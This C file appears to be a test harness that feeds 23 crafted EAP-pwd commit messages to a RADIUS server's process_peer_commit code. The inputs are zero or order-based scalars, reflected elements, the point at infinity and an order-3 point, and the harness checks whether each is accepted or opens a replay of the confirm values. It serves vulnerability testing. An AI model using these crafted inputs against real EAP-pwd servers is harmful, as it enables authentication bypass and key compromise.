#include "eap-pwd.h"

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <attack number>\n\n", argv[0]);
        printf("Return code indicates whether or not the attack was successful.\n");
        printf("Known attacks:\n");
        printf("\t1. scalar_p = 0, element_p = random\n");
        printf("\t2. scalar_p = 1, element_p = random\n");
        printf("\t3. scalar_p = r, element_p = random\n");
        printf("\t4. scalar_p = r + 1, element_p = random\n");
        printf("\t5. scalar_p = r + 1, element_p = random\n");
        printf("\t6. scalar_p = 0, element_p = {0}\n");
        printf("\t7. scalar_p = 1, element_p = {0}\n");
        printf("\t8. scalar_p = 0, element_p = element_s\n");
        printf("\t9. scalar_p = 1, element_p = element_s\n");
        printf("\t10. scalar_p = scalar_s, element_p = element_s\n");
        printf("\t11. scalar_p = scalar_s, element_p = element_s^{-1}\n");
        printf("\t12. scalar_p = 0, element_p = element_s^{-1}\n");
        printf("\t13. scalar_p = r - 1, element_p = element_s\n");
        printf("\t14. scalar_p = r - 1, element_p = element_s^{-1}\n");
        printf("\t15. scalar_p = scalar_s^{-1}, element_p = element_s\n");
        printf("\t16. scalar_p = scalar_s^{-1}, element_p = element_s^{-1}\n");
        printf("\t17. scalar_p = scalar_s, element_p = {0}\n");
        printf("\t18. scalar_p = scalar_s^{-1}, element_p = {0}\n");
        printf("\t19. scalar_p = 0, element_p = <order-3 group>\n");
        printf("\t\tx = 5a9a06c49c618e65973799292cf4f90a82b2860065cf2de30fb4076dd5b8d28d\n");
        printf("\t\ty = bd065f2819e3e25ee3892f04775ffddeb4692a2dcc7ba5205ce729a9b05bead2\n");
        printf("\t20. scalar_p = 0, element_p = {0-ish: x == y == r}\n");
        printf("\t21. scalar_p = 0, element_p = {from-compressed: x = 0, y = 0}\n");
        printf("\t22. scalar_p = 1, element_p = <order-3 group>\n");
        printf("\t23. scalar_p = scalar_s, element_p = <order-3 group>\n");
        return 1;
    }

    BN_CTX *bnctx = BN_CTX_new();
    pwd_session_t session;


    /* Not used by process_peer_commit */
    session.state = 0;
    session.group_num = 0;
    session.ciphersuite = 0;
    session.token = 0;
    memset(session.peer_id, 0, MAX_STRING_LEN);
    session.peer_id_len = 0;
    session.mtu = 0;
    session.in = NULL;
    session.in_pos = 0;
    session.in_len = 0;
    session.out = NULL;
    session.out_pos = 0;
    session.out_len = 0;
    memset(session.my_confirm, 0, SHA256_DIGEST_LENGTH);


    /* Things we need to specify */
    // compute_password_element() -- eap_pwd.c#L139
    session.group = EC_GROUP_new_by_curve_name(NID_X9_62_prime256v1);

    // compute_password_element() -- eap_pwd.c#L158
    session.order = BN_new();
    if (!EC_GROUP_get_order(session.group, session.order, NULL)) {
        ERROR("Unable to get order for curve");
        return -1;
    }

    // compute_password_element() -- eap_pwd.c#L153
    session.prime = BN_new();
    if (!EC_GROUP_get_curve_GFp(session.group, session.prime, NULL, NULL, NULL)) {
        ERROR("Unable to get prime for GFp curve");
        return -1;
    }

    // Generate a random point to emulate an unknown shared secret.
    session.pwe = get_random_EC_POINT(session.group, session.order, bnctx);
    assert(session.pwe != NULL);

    // Generate a random private value
    // compute_scalar_element -- eap_pwd.c#L274
    session.private_value = get_random_max(session.order);
    assert(session.private_value != NULL);

    // Generate a random private mask
    // compute_scalar_element -- eap_pwd.c#L278
    BIGNUM *private_mask = get_random_max(session.order);
    assert(private_mask != NULL);

    // Generate scalar
    // compute_scalar_element -- eap_pwd.c#L282
    session.my_scalar = compute_eap_pwd_scalar(session.private_value, private_mask, session.order, bnctx);
    assert(session.my_scalar != NULL);

    // Generate element
    // compute_scalar_element -- eap_pwd.c#L285
    session.my_element = compute_eap_pwd_element(session.pwe, private_mask, session.group, bnctx);
    assert(session.my_element != NULL);

    /* Things we copy/create in process_peer_commit */
    session.peer_scalar = NULL;
    session.peer_element = NULL;
    session.k = NULL;


    /* Here comes the fun part -- attacks! */
    BIGNUM *scalar_p = NULL;
    EC_POINT *element_p = NULL;

    if (strcmp(argv[1], "1") == 0) {
        scalar_p = BN_new();
        BN_zero(scalar_p);
        element_p = get_random_EC_POINT(session.group, session.order, bnctx);
    } else if (strcmp(argv[1], "2") == 0) {
        scalar_p = BN_new();
        BN_one(scalar_p);
        element_p = get_random_EC_POINT(session.group, session.order, bnctx);
    } else if (strcmp(argv[1], "3") == 0) {
        scalar_p = BN_new();
        BN_copy(scalar_p, session.order);
        element_p = get_random_EC_POINT(session.group, session.order, bnctx);
    } else if (strcmp(argv[1], "4") == 0) {
        scalar_p = BN_new();
        BN_copy(scalar_p, session.order);
        BN_add_word(scalar_p, 1);
        element_p = get_random_EC_POINT(session.group, session.order, bnctx);
    } else if (strcmp(argv[1], "5") == 0) {
        scalar_p = BN_new();
        BN_copy(scalar_p, session.order);
        BN_add_word(scalar_p, 2);
        element_p = get_random_EC_POINT(session.group, session.order, bnctx);
    } else if (strcmp(argv[1], "6") == 0) {
        scalar_p = BN_new();
        BN_zero(scalar_p);
        element_p = EC_POINT_new(session.group);
        EC_POINT_set_to_infinity(session.group, element_p);
    } else if (strcmp(argv[1], "7") == 0) {
        scalar_p = BN_new();
        BN_one(scalar_p);
        element_p = EC_POINT_new(session.group);
        EC_POINT_set_to_infinity(session.group, element_p);
    } else if (strcmp(argv[1], "8") == 0) {
        scalar_p = BN_new();
        BN_zero(scalar_p);
        element_p = EC_POINT_new(session.group);
        EC_POINT_copy(element_p, session.my_element);
    } else if (strcmp(argv[1], "9") == 0) {
        scalar_p = BN_new();
        BN_one(scalar_p);
        element_p = EC_POINT_new(session.group);
        EC_POINT_copy(element_p, session.my_element);
    } else if (strcmp(argv[1], "10") == 0) {
        scalar_p = BN_new();
        BN_copy(scalar_p, session.my_scalar);
        element_p = EC_POINT_new(session.group);
        EC_POINT_copy(element_p, session.my_element);
    } else if (strcmp(argv[1], "11") == 0) {
        scalar_p = BN_new();
        BN_copy(scalar_p, session.my_scalar);
        element_p = EC_POINT_new(session.group);
        EC_POINT_copy(element_p, session.my_element);
        EC_POINT_invert(session.group, element_p, bnctx);
    } else if (strcmp(argv[1], "12") == 0) {
        scalar_p = BN_new();
        BN_zero(scalar_p);
        element_p = EC_POINT_new(session.group);
        EC_POINT_copy(element_p, session.my_element);
        EC_POINT_invert(session.group, element_p, bnctx);
    } else if (strcmp(argv[1], "13") == 0) {
        scalar_p = BN_new();
        BN_one(scalar_p);
        BN_sub(scalar_p, session.order, scalar_p);
        element_p = EC_POINT_new(session.group);
        EC_POINT_copy(element_p, session.my_element);
    } else if (strcmp(argv[1], "14") == 0) {
        scalar_p = BN_new();
        BN_one(scalar_p);
        BN_sub(scalar_p, session.order, scalar_p);
        element_p = EC_POINT_new(session.group);
        EC_POINT_copy(element_p, session.my_element);
        EC_POINT_invert(session.group, element_p, bnctx);
    } else if (strcmp(argv[1], "15") == 0) {
        scalar_p = BN_new();
        BN_mod_sub(scalar_p, session.order, session.my_scalar, session.order, bnctx);
        element_p = EC_POINT_new(session.group);
        EC_POINT_copy(element_p, session.my_element);
    } else if (strcmp(argv[1], "16") == 0) {
        scalar_p = BN_new();
        BN_mod_sub(scalar_p, session.order, session.my_scalar, session.order, bnctx);
        element_p = EC_POINT_new(session.group);
        EC_POINT_copy(element_p, session.my_element);
        EC_POINT_invert(session.group, element_p, bnctx);
    } else if (strcmp(argv[1], "17") == 0) {
        scalar_p = BN_new();
        BN_copy(scalar_p, session.my_scalar);
        element_p = EC_POINT_new(session.group);
        EC_POINT_set_to_infinity(session.group, element_p);
    } else if (strcmp(argv[1], "18") == 0) {
        scalar_p = BN_new();
        BN_mod_sub(scalar_p, session.order, session.my_scalar, session.order, bnctx);
        element_p = EC_POINT_new(session.group);
        EC_POINT_set_to_infinity(session.group, element_p);
    } else if (strcmp(argv[1], "19") == 0) {
        scalar_p = BN_new();
        BN_zero(scalar_p);
        element_p = get_point_from_hex(session.group,
                "5a9a06c49c618e65973799292cf4f90a82b2860065cf2de30fb4076dd5b8d28d",
                "bd065f2819e3e25ee3892f04775ffddeb4692a2dcc7ba5205ce729a9b05bead2",
                bnctx);
    } else if (strcmp(argv[1], "20") == 0) {
        scalar_p = BN_new();
        BN_zero(scalar_p);

        // "zero" element: double order
        element_p = get_point_from_hex(session.group,
                "FFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551",
                "FFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551",
                bnctx);
    } else if (strcmp(argv[1], "21") == 0) {
        scalar_p = BN_new();
        BN_zero(scalar_p);
        element_p = EC_POINT_new(session.group);
        EC_POINT_set_compressed_coordinates_GFp(session.group, element_p,
                scalar_p, 0, bnctx);
    } else if (strcmp(argv[1], "22") == 0) {
        scalar_p = BN_new();
        BN_one(scalar_p);
        element_p = get_point_from_hex(session.group,
                "5a9a06c49c618e65973799292cf4f90a82b2860065cf2de30fb4076dd5b8d28d",
                "bd065f2819e3e25ee3892f04775ffddeb4692a2dcc7ba5205ce729a9b05bead2",
                bnctx);
    } else if (strcmp(argv[1], "23") == 0) {
        scalar_p = BN_new();
        BN_copy(scalar_p, session.my_scalar);
        element_p = get_point_from_hex(session.group,
                "5a9a06c49c618e65973799292cf4f90a82b2860065cf2de30fb4076dd5b8d28d",
                "bd065f2819e3e25ee3892f04775ffddeb4692a2dcc7ba5205ce729a9b05bead2",
                bnctx);
    } else {
        printf("Unknown attack: %s\n", argv[1]);
        return 1;
    }

    uint8_t *in;
    size_t in_len;


    /* Encode our attack and try it out... :) */
    // mod_process -- rlm_eap_pwd.c#L344
    in = encode_attack(&in_len, session.group, session.order, session.prime, element_p, scalar_p, bnctx);

    // Print out the contents of the attack as sent over the wire.
    printf("Wire contents (%zu): ", in_len);
    for (size_t i = 0; i < in_len; i++) {
        printf("%02X", in[i]);
    }
    printf("\n");

    // Process the request and see what the server says about it...
    int result = process_peer_commit(&session, in, in_len, bnctx);

    // Send a simple replay attack and see if it passes
    if (compute_server_confirm(&session, session.my_confirm, bnctx)) {
        DEBUG2("pwd exchange cannot compute server's confirm");
        return 1;
    }

    uint8_t peer_confirm[SHA256_DIGEST_LENGTH];
    if (compute_peer_confirm(&session, peer_confirm, bnctx)) {
        DEBUG2("pwd exchange cannot compute peer's confirm");
        return 1;
    }

    if (memcmp(session.my_confirm, peer_confirm, SHA256_DIGEST_LENGTH) == 0) {
        printf("Replay attack would succeed!\n");
    }

    printf("Server Confirm: ");
    for (size_t i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        printf("%02X", session.my_confirm[i]);
    }
    printf("\n");

    printf("Client Confirm: ");
    for (size_t i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        printf("%02X", peer_confirm[i]);
    }
    printf("\n");

    print_debug(result, &session, element_p, scalar_p, bnctx);

    return result;
}
